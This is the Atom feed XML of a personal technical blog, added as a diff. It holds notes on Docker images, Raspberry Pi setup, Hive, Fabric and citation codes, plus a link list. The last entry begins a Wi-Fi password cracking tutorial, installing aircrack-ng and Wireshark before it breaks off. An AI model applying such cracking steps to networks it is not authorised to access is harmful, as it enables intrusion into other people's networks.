@@ -1,0 +1,458 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title><![CDATA[Guwen's Studio]]></title>
+  <subtitle><![CDATA[Guwen's Studio]]></subtitle>
+  <link href="/atom.xml" rel="self"/>
+  <link href="http://gwpost.github.com/"/>
+  <updated>2016-04-21T12:20:54.077Z</updated>
+  <id>http://gwpost.github.com/</id>
+  
+  <author>
+    <name><![CDATA[Gu Wen]]></name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[Chapter3-Getting Started with Docker]]></title>
+    <link href="http://gwpost.github.com/2016/04/21/docker/docker-chapter3/"/>
+    <id>http://gwpost.github.com/2016/04/21/docker/docker-chapter3/</id>
+    <published>2016-04-21T12:03:56.000Z</published>
+    <updated>2016-04-21T12:20:54.077Z</updated>
+    <content type="html"></content>
+    <summary type="html">
+    
+    </summary>
+    
+      <category term="docker" scheme="http://gwpost.github.com/categories/docker/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Chapter4-Working with Docker images and repositories]]></title>
+    <link href="http://gwpost.github.com/2016/04/21/docker/docker-chapter4/"/>
+    <id>http://gwpost.github.com/2016/04/21/docker/docker-chapter4/</id>
+    <published>2016-04-21T12:03:56.000Z</published>
+    <updated>2016-04-21T13:38:02.484Z</updated>
+    <content type="html"><![CDATA[<p>We’ll learn a lot more about Docker images, what they are, how to manage them, how to modify them, and how to create, store, and share your own images.We’ll also examine the repositories that hold images and the registries that store repositories.</p>
+<h2 id="Images">Images</h2><ol>
+<li>Docker images is the building blocks from which we launch containers.</li>
+<li>A Docker image is made up of filesystems layered over each other. At the base is a boot filesystem, bootfs, which resembles the typical Linux/Unix boot filesystem. A Docker user will probably never interact with the boot filesystem. Indeed, when a container has booted, it is moved into memory, and the boot filesystem is unmounted to free up the RAM used by the initrd disk image.</li>
+<li>Docker next layers a root filesystem, rootfs, on top of the boot filesystem. This rootfs can be one or more operating systems (e.g., a Debian or Ubuntu filesystem).<br>In the Docker world, however, the root filesystem stays in read-only mode, and Docker takes advantage of a union mount to add more read-only filesystems onto the root filesystem.<br>The union mount overlays the filesystems on top of one another so that the resulting filesystem may contain files and subdirectories from any or all of the underlying filesystems.</li>
+<li>Docker calls each of these filesystems images.</li>
+<li>The image below is called the parent image and you can traverse each layer until you reach the bottom of the image stack where the final image is called the base image.</li>
+<li>when a container is launched from an image, Docker mounts a read-write filesystem on top of any layers below.This is where whatever processes we want our Docker container to run will execute.</li>
+<li>When Docker first starts a container, the initial read-write layer is empty. As changes occur, they are applied to this layer;</li>
+<li>This pattern is traditionally called “copy on write” and is one of the features that makes Docker so powerful. Each read-only image layer is read-only; this image never changes. When a container is created, Docker builds from the stack of im- ages and then adds the read-write layer on top. That layer, combined with the knowledge of the image layers below it and some configuration data, form the container.</li>
+</ol>
+<h2 id="Listing_Docker_images">Listing Docker images</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sudo</span> docker images</span><br></pre></td></tr></table></figure>
+<ol>
+<li>Local images live on our local Docker host in the /var/lib/docker di- rectory. Each image will be inside a directory named for your storage driver;<br>for example, aufs or devicemapper.</li>
+<li>Images are stored in repositories. You can think of an image repository as being much like a Git repository. It contains images, layers, and metadata about those images.</li>
+<li>We identify each image inside that repository by what Docker calls tags.</li>
+<li>We can refer to a specific image inside a repository by suffixing the repository name with a colon and a tag name.</li>
+<li>There are two types of repositories: user repositories, which contain images con- tributed by Docker users, and top-level repositories, which are controlled by the people behind Docker.A user repository takes the form of a username and a repository name.A top-level repository only has a repository name like ubuntu.</li>
+</ol>
+<h2 id="Pulling_images">Pulling images</h2><ol>
+<li><p>When we run a container from images with the <code>docker run</code> command,by default,if you don’t specify a specific tag, Docker will download the latest tag.</p>
+</li>
+<li><p>Pulling the fedora image</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull fedora</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Viewing the fedora image</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker images fedora</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="Searching_for_images">Searching for images</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker search puppet</span><br></pre></td></tr></table></figure>
+<h2 id="Building_our_own_images">Building our own images</h2><ol>
+<li><p>two ways to create a Docker image:</p>
+<ul>
+<li>Via the docker commit command;</li>
+<li>Via the docker build command with a Dockerfile;<br>Note: The docker commit method is not currently recommended, as building with a Dockerfile is far more flexible and powerful.</li>
+</ul>
+</li>
+<li><p>Logging into the Docker Hub</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker login</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Committing the custom container</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker commit <span class="number">4</span>aab3ce3cb76 jamtur01/apache2</span><br></pre></td></tr></table></figure>
+<p>To find that ID you could use the <code>docker ps -l -q</code> command to return the ID of the last created container.The docker commit command only commits the differences between the image the container was created from and the current state of the container.</p>
+</li>
+<li><p>Docker executing instructions roughly follow a workflow:</p>
+<ul>
+<li>Docker runs a container from the image.</li>
+<li>An instruction executes and makes a change to the container.</li>
+<li>Docker runs the equivalent of docker commit to commit a new layer.</li>
+<li>Docker then runs a new container from this new image.</li>
+<li>The next instruction in the file is executed, and the process repeats until all instructions have been executed.</li>
+</ul>
+</li>
+<li><p>the RUN instruction in exec form</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN [ <span class="string">"apt-get"</span>, <span class="string">" install"</span>, <span class="string">"-y"</span>, <span class="string">"nginx"</span> ]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Running the Dockerfile    </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker build -t=<span class="string">"jamtur01/static_web"</span> .</span><br></pre></td></tr></table></figure>
+<p>-t option to mark our resulting image with a repository and a name</p>
+</li>
+<li><p>Dockerfiles and the build cache<br>If, in our debugging example, we did not need to change anything in Steps 1 to 3, then Docker would use the previously built images as a cache and a starting point. Essentially, it’d start the build process straight from Step 4.</p>
+</li>
+<li><p>Viewing our new image</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker images jamtur01/static_web</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Using the docker history command</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker <span class="built_in">history</span> <span class="number">22</span>d47c8cb6e5</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Viewing the Docker port mapping</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps <span class="operator">-l</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>The docker port command</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker port <span class="number">6751</span>b94bb5c0 <span class="number">80</span></span><br></pre></td></tr></table></figure>
+<p>We’ve specified the container ID and the container port for which we’d like to see the mapping, 80.</p>
+</li>
+<li><p>Exposing a port with docker run</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run <span class="operator">-d</span> -P --name static_web jamtur01/static_web</span><br></pre></td></tr></table></figure>
+<p>Docker also has a shortcut, -P, that allows us to expose all ports we’ve specified via EXPOSE instructions in our Dockerfile.It would also expose any additional ports we had specified with other EXPOSE instructions in the Dockerfile that built our image.</p>
+</li>
+</ol>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>We’ll learn a lot more about Docker images, what they are, how to manage them, how to modify them, and how to create, store, and share yo]]>
+    </summary>
+    
+      <category term="docker" scheme="http://gwpost.github.com/categories/docker/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[配置树莓派无线网络]]></title>
+    <link href="http://gwpost.github.com/2016/04/16/raspberrypi/network/"/>
+    <id>http://gwpost.github.com/2016/04/16/raspberrypi/network/</id>
+    <published>2016-04-16T01:33:36.000Z</published>
+    <updated>2016-04-16T04:59:44.969Z</updated>
+    <content type="html"><![CDATA[<h2 id="1-编辑网络接口配置文件">1.编辑网络接口配置文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br></pre></td></tr></table></figure>
+<h2 id="2-修改无线网络信息和设置固定IP">2.修改无线网络信息和设置固定IP</h2><p><img src="./interfaces.png" alt=""></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h2 id="1-编辑网络接口配置文件">1.编辑网络接口配置文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pr]]>
+    </summary>
+    
+      <category term="raspberrrypi" scheme="http://gwpost.github.com/categories/raspberrrypi/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Ubuntu烧录树莓派镜像]]></title>
+    <link href="http://gwpost.github.com/2016/04/16/raspberrypi/burn-img/"/>
+    <id>http://gwpost.github.com/2016/04/16/raspberrypi/burn-img/</id>
+    <published>2016-04-16T01:33:36.000Z</published>
+    <updated>2016-04-16T03:04:01.598Z</updated>
+    <content type="html"><![CDATA[<h2 id="1-查看TF的设备名">1.查看TF的设备名</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fdisk <span class="operator">-l</span></span><br></pre></td></tr></table></figure>
+<p><img src="./fdisk.png" alt="fdisk"></p>
+<h2 id="2-将镜像烧录至SD卡">2.将镜像烧录至SD卡</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dd bs=<span class="number">4</span>M <span class="keyword">if</span>=<span class="number">2015</span>-<span class="number">05</span>-<span class="number">05</span>-wheezy-raspbian.img of=/dev/sdb</span><br></pre></td></tr></table></figure>
+<p><img src="./dd.png" alt="fdisk"></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>bs</td>
+<td>blocksize的缩写，表示一次写入多大的块</td>
+<td>4M一般都没问题，如果不行，试试改成1M</td>
+</tr>
+<tr>
+<td>if</td>
+<td>input file缩写，表示镜像的路径</td>
+<td>$12</td>
+</tr>
+<tr>
+<td>of</td>
+<td>output file的缩写 ，表示设备名</td>
+<td>Linux上一切都是文件</td>
+</tr>
+</tbody>
+</table>
+<p>备注：因为dd命令没有进度显示，所以看上去可能感觉假死了，此时只要等待几分钟即可。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h2 id="1-查看TF的设备名">1.查看TF的设备名</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></]]>
+    </summary>
+    
+      <category term="raspberrrypi" scheme="http://gwpost.github.com/categories/raspberrrypi/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[关于记笔记的一些思考]]></title>
+    <link href="http://gwpost.github.com/2016/04/15/writing-notes/"/>
+    <id>http://gwpost.github.com/2016/04/15/writing-notes/</id>
+    <published>2016-04-15T11:53:39.000Z</published>
+    <updated>2016-04-15T11:58:32.582Z</updated>
+    <content type="html"><![CDATA[<ol>
+<li>因为你曾经在 Google 搜索结果里翻了好几页才找到的答案，下次搜索时还要再找一遍，效率是不高的</li>
+<li>用纸记录笔记已经不适合。每次搬家或清理时，曾经写满笔记的小本子都会被我遗弃掉，如果不翻开那些小本子，我几乎不会记得我曾经记录过什么东西。一旦那些纸质笔记本被我扔掉，之前记录的所有笔记内容都会从我的记忆中抹去。</li>
+<li>现在市面上大多数的笔记软件的文件存储都是使用私有格式，一旦它停止服务，你只能寄希望于它提供的导出功能，然后盼望着另外一家笔记软件能导入这些笔记</li>
+</ol>
+]]></content>
+    <summary type="html">
+    <![CDATA[<ol>
+<li>因为你曾经在 Google 搜索结果里翻了好几页才找到的答案，下次搜索时还要再找一遍，效率是不高的</li>
+<li>用纸记录笔记已经不适合。每次搬家或清理时，曾经写满笔记的小本子都会被我遗弃掉，如果不翻开那些小本子，我几乎不会记得我曾经记录过什么东西。一旦那些]]>
+    </summary>
+    
+      <category term="MyThinking" scheme="http://gwpost.github.com/categories/MyThinking/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[thesis]]></title>
+    <link href="http://gwpost.github.com/2016/01/14/thesis-2016-01-14/"/>
+    <id>http://gwpost.github.com/2016/01/14/thesis-2016-01-14/</id>
+    <published>2016-01-14T02:43:09.000Z</published>
+    <updated>2016-01-14T02:45:44.368Z</updated>
+    <content type="html"><![CDATA[<p>国家期刊出版格式要求在中图分类号的下面应标出文献标识码，规定如下：<br>作者可从下列A、B、C、D、E中选用一种标识码来揭示文章的性质：<br>A—理论与应用研究学术论文（包括综述报告）；<br>B—实用性成果报告（科学技术）、理论学习与社会实践总结（科技）；<br>C—业务指导与技术管理的文章（包括特约评论）；<br>D—一般性通讯、报导、专访等；<br>E—文件、资料、人物、书刊、知识介绍等。</p>
+<p>注：英文的文献标识码应与中文对应。<br>[参考文献类型标识码]<br>M——专著 Monograph ；<br>C——-论文集Collection ；<br>N——报纸文章 News；<br> J——期刊文章 Journal；<br>D——学位论文 Degree；<br>R——报告 Report；<br> S——标准 Standard；<br> P——专利 Patent；<br>A——专著、论文集中的析出文献 Article；<br>Z——其它末说明文献 </p>
+<p>（1）文献类型标识：专著[M]；期刊[J]；论文集[c]；学位论文[D]；<br>标准[S]；报告[R]；专利[P]；报纸[N]；<br>（2）电子文献类型标识：数据库[DB]；计算机程序[CP]；电子公告[EB]；<br>（3）电子文献的载体类型及其标识：联机网上数据库[DB／OL]；</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>国家期刊出版格式要求在中图分类号的下面应标出文献标识码，规定如下：<br>作者可从下列A、B、C、D、E中选用一种标识码来揭示文章的性质：<br>A—理论与应用研究学术论文（包括综述报告）；<br>B—实用性成果报告（科学技术）、理论学习与社会实践总结（科技）；<br>C—]]>
+    </summary>
+    
+      <category term="thesis" scheme="http://gwpost.github.com/categories/thesis/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Hive学习笔记]]></title>
+    <link href="http://gwpost.github.com/2016/01/09/bigdata/hive-learn-note-2016-01-09/"/>
+    <id>http://gwpost.github.com/2016/01/09/bigdata/hive-learn-note-2016-01-09/</id>
+    <published>2016-01-09T06:57:36.000Z</published>
+    <updated>2016-01-09T07:56:18.728Z</updated>
+    <content type="html"><![CDATA[<p>hive是基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张数据库表，并提供简单的sql查询功能，可以将sql语句转换为MapReduce任务进行运行。 其优点是学习成本低，可以通过类SQL语句快速实现简单的MapReduce统计，不必开发专门的MapReduce应用，十分适合数据仓库的统计分析。</p>
+<h1 id="定义">定义</h1><p>Hive是建立在 Hadoop 上的数据仓库基础构架。它提供了一系列的工具，可以用来进行数据提取转化加载（ETL），这是一种可以存储、查询和分析存储在 Hadoop 中的大规模数据的机制。Hive 定义了简单的类 SQL 查询语言，称为 HQL，它允许熟悉 SQL 的用户查询数据。同时，这个语言也允许熟悉 MapReduce 开发者的开发自定义的 mapper 和 reducer 来处理内建的 mapper 和 reducer 无法完成的复杂的分析工作。<br>Hive 没有专门的数据格式。 Hive 可以很好的工作在 Thrift 之上，控制分隔符，也允许用户指定数据格式。</p>
+<h1 id="适用场景">适用场景</h1><p>Hive 构建在基于静态批处理的Hadoop 之上，Hadoop 通常都有较高的延迟并且在作业提交和调度的时候需要大量的开销。因此，Hive 并不能够在大规模数据集上实现低延迟快速的查询，例如，Hive 在几百MB 的数据集上执行查询一般有分钟级的时间延迟。因此，Hive 并不适合那些需要低延迟的应用，例如，联机事务处理（OLTP）。Hive 查询操作过程严格遵守Hadoop MapReduce 的作业执行模型，Hive 将用户的HiveQL 语句通过解释器转换为MapReduce 作业提交到Hadoop 集群上，Hadoop 监控作业执行过程，然后返回作业执行结果给用户。Hive 并非为联机事务处理而设计，Hive 并不提供实时的查询和基于行级的数据更新操作。Hive 的最佳使用场合是大数据集的批处理作业，例如，网络日志分析。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>hive是基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张数据库表，并提供简单的sql查询功能，可以将sql语句转换为MapReduce任务进行运行。 其优点是学习成本低，可以通过类SQL语句快速实现简单的MapReduce统计，不必开发专门的MapRe]]>
+    </summary>
+    
+      <category term="bigdata" scheme="http://gwpost.github.com/categories/bigdata/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[fabric]]></title>
+    <link href="http://gwpost.github.com/2015/12/30/fabric-2015-12-30/"/>
+    <id>http://gwpost.github.com/2015/12/30/fabric-2015-12-30/</id>
+    <published>2015-12-30T08:13:50.000Z</published>
+    <updated>2015-12-30T08:27:45.935Z</updated>
+    <content type="html"><![CDATA[<h1 id="What_is_Fabric_?">What is Fabric ?</h1><p> <code>Fabric</code> is a Python (2.5-2.7) library and command-line tool for streamlining <code>the use of SSH</code> for <code>application deployment</code> or <code>systems administration tasks</code>.</p>
+<p>More specifically, Fabric is:   </p>
+<ul>
+<li>A tool that lets you<code>execute arbitrary Python functions</code> via the command line;  </li>
+<li>A library of subroutines (built on top of a lower-level library) to make <code>executing shell commands over SSH</code> easy and Pythonic.</li>
+</ul>
+<p>Naturally, most users combine these two things, using Fabric to write and execute Python functions, or tasks, to automate interactions with remote servers. Let’s take a look.</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h1 id="What_is_Fabric_?">What is Fabric ?</h1><p> <code>Fabric</code> is a Python (2.5-2.7) library and command-line tool for streamlining ]]>
+    </summary>
+    
+      <category term="python" scheme="http://gwpost.github.com/categories/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[技术文章,每天读一点]]></title>
+    <link href="http://gwpost.github.com/2015/12/18/helpful-links-2015-12-18/"/>
+    <id>http://gwpost.github.com/2015/12/18/helpful-links-2015-12-18/</id>
+    <published>2015-12-18T12:57:35.000Z</published>
+    <updated>2015-12-18T14:37:27.906Z</updated>
+    <content type="html"><![CDATA[<h1 id="Java">Java</h1><ul>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BKpdfHL&amp;up=" target="_blank" rel="external">Java应用一般架构</a></li>
+</ul>
+<h1 id="Linux">Linux</h1><ul>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BSA3uw4&amp;up=" target="_blank" rel="external">为什么说systemd是系统管理员的利器</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BS4R6tN&amp;up=" target="_blank" rel="external">Linux运维比较实用的工具</a></li>
+</ul>
+<h1 id="Python">Python</h1><ul>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0Bc1kOa6&amp;up=1" target="_blank" rel="external">亲测，手把手教你用Python抢票</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0Bcaz4Wg&amp;up=313" target="_blank" rel="external">12306的变态验证码算什么？我有Python神器</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BVUao6L&amp;up=" target="_blank" rel="external">7 款 Python 可视化工具对比</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BVMUhV8&amp;up=" target="_blank" rel="external">Python 程序员都会喜欢的 6 个库</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BTOYAi7&amp;up=" target="_blank" rel="external">告诉你，为什么开发、运维和数据都需要用Python！</a></li>
+</ul>
+<h1 id="大数据">大数据</h1><ul>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BeQTyER&amp;up=166" target="_blank" rel="external">大数据分析方法解读以及相关工具介绍</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BfKT3RW&amp;up=188" target="_blank" rel="external">2分钟读懂大数据框架Hadoop和Spark的异同</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BbrgbhX&amp;up=200" target="_blank" rel="external">百度资深专家：我在大数据项目中踩过的那些坑</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BYB5bcu&amp;up=392" target="_blank" rel="external">带您了解大数据</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BK03pY8&amp;up=313" target="_blank" rel="external">数据科学 怎样进行大数据的入门级学习？</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0AgT4SZD&amp;up=" target="_blank" rel="external">三种数据部门架构优与劣</a></li>
+</ul>
+<h1 id="数据可视化">数据可视化</h1><ul>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BZIv9nk&amp;up=245" target="_blank" rel="external">数据可视化、信息可视化、知识可视化</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0Bg2v0sH&amp;up=200" target="_blank" rel="external">14款基于javascript的数据可视化工具</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BRr2NDS&amp;up=" target="_blank" rel="external">大数据有哪些炫酷可视化应用？</a></li>
+</ul>
+<h1 id="机器学习">机器学习</h1><ul>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0Bi3GW7G&amp;up=1113" target="_blank" rel="external">数据科学中最好的5个机器学习API</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BbDX2hW&amp;up=392" target="_blank" rel="external">机器学习初识</a></li>
+</ul>
+<h1 id="数据挖掘">数据挖掘</h1><ul>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0AuVqVkf&amp;up=undefined" target="_blank" rel="external">互联网和金融，在数据挖掘上究竟存在什么区别</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0AtTLPCv&amp;up=" target="_blank" rel="external">数据科学家知识体系与数据分析完整流程</a></li>
+</ul>
+<h1 id="爬虫">爬虫</h1><ul>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BgKrb6I&amp;up=561" target="_blank" rel="external">雅虎开源解析 HTML 页面数据的 Web 爬取工具 Anthelion</a></li>
+</ul>
+<h1 id="Docker">Docker</h1><ul>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BfnnTpw&amp;up=437" target="_blank" rel="external">Docker脑洞大开的奇思妙用</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BTfnoQz&amp;up=" target="_blank" rel="external">用浏览器管理 Docker</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BSEroZN&amp;up=" target="_blank" rel="external">Docker容器 vs 全虚拟化</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BQMpc3B&amp;up=" target="_blank" rel="external">如何使用docker精简开发过程?</a></li>
+</ul>
+<h1 id="运维">运维</h1><ul>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BhK9lb8&amp;up=471" target="_blank" rel="external">运维排查问题的方法和脚本</a></li>
+</ul>
+<h1 id="AngularJs">AngularJs</h1><ul>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BSbQPQS&amp;up=" target="_blank" rel="external">10 个非常有用的 AngularJS 框架</a></li>
+</ul>
+<h1 id="前端">前端</h1><ul>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BZYZaLs&amp;up=313" target="_blank" rel="external">29个前端工程师和设计师必备的Chrome插件</a></li>
+</ul>
+<h1 id="树莓派">树莓派</h1><ul>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BU6smrN&amp;up=" target="_blank" rel="external">树莓派初学者？先做做这十个项目吧</a></li>
+</ul>
+<h1 id="Arduino">Arduino</h1><ul>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BhbEX37&amp;up=188" target="_blank" rel="external">控制Arduino的利器-Windows Remote Arduino</a></li>
+</ul>
+<h1 id="程序员提高">程序员提高</h1><ul>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BfkfiqM&amp;up=2381" target="_blank" rel="external">26岁程序员的出路</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BeBX8zt&amp;up=414" target="_blank" rel="external">如何利用碎片时间，和别人拉开距离</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BenLIIw&amp;up=4" target="_blank" rel="external">菜鸟程序员如何才能快速提高自己的技术</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BFMe5nz&amp;up=256" target="_blank" rel="external">可以使你成为更优秀程序员的5个好习惯</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0Banmzzo&amp;up=787" target="_blank" rel="external">论程序员的自我修养</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0Bf5fGLG&amp;up=undefined" target="_blank" rel="external">GitHub上整理的一些工具</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BRzHg9t&amp;up=" target="_blank" rel="external">一个印度程序员的生活领悟</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BSV9mTN&amp;up=" target="_blank" rel="external">程序员如何在技术面试表现得更出色？</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BTWLi3a&amp;up=" target="_blank" rel="external">阿里员工的离职总结：如何在大公司生存？</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BRyBWvS&amp;up=" target="_blank" rel="external">技术人员必读的7佳高端访谈录</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BSquaSs&amp;up=" target="_blank" rel="external">方法论丨程序员的有效学习策略</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BfUNZ0H&amp;up=154" target="_blank" rel="external">麻省理工和加州理工的学霸是如何学习的?</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BUnJg5m&amp;up=" target="_blank" rel="external">写给程序猿的把妹指南:概述篇</a></li>
+<li><a href="http://mt.sohu.com/20151128/n428663716.shtml" target="_blank" rel="external">李嘉诚的人生修行：孤独是一种力量</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BN6RALJ&amp;up=" target="_blank" rel="external">要创业，你必须知道这些团队协作工具</a></li>
+</ul>
+<h1 id="PPT">PPT</h1><ul>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BXtbxhg&amp;up=" target="_blank" rel="external">史上最全PPT模板网站就在这里</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BVooD0Y&amp;up=" target="_blank" rel="external">这里有最全的PPT模板资源，这里有全套的解决方案！</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BVA3Zb0&amp;up=" target="_blank" rel="external">你们做的PPT为什么这么垃圾?</a></li>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BRSp64r&amp;up=" target="_blank" rel="external">怎样做好学术 PPT？</a></li>
+</ul>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h1 id="Java">Java</h1><ul>
+<li><a href="http://www.yidianzixun.com/home?page=article&amp;id=0BKpdfHL&amp;up=" target="_blank" rel="external]]>
+    </summary>
+    
+      <category term="links" scheme="http://gwpost.github.com/categories/links/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[WIFI密码破解]]></title>
+    <link href="http://gwpost.github.com/2015/11/27/wifi-crack-2015-11-27/"/>
+    <id>http://gwpost.github.com/2015/11/27/wifi-crack-2015-11-27/</id>
+    <published>2015-11-27T11:59:36.000Z</published>
+    <updated>2015-11-27T14:17:45.438Z</updated>
+    <content type="html"><![CDATA[<h1 id="安装Wireshark">安装Wireshark</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install wireshark</span><br><span class="line">$ sudo dpkg-reconfigure wireshark-common </span><br><span class="line">$ sudo usermod <span class="operator">-a</span> -G wireshark <span class="variable">$USER</span></span><br><span class="line">$ sudo reboot </span><br><span class="line">或者`注销`</span><br><span class="line">$ gnome-session-quit --logout --no-prompt</span><br></pre></td></tr></table></figure>
+<h1 id="WIFI密码破解">WIFI密码破解</h1><ol>
+<li><p>安装工具包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$  sudo apt-get install aircrack-ng</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>把电脑网卡变成监听模式  </p>
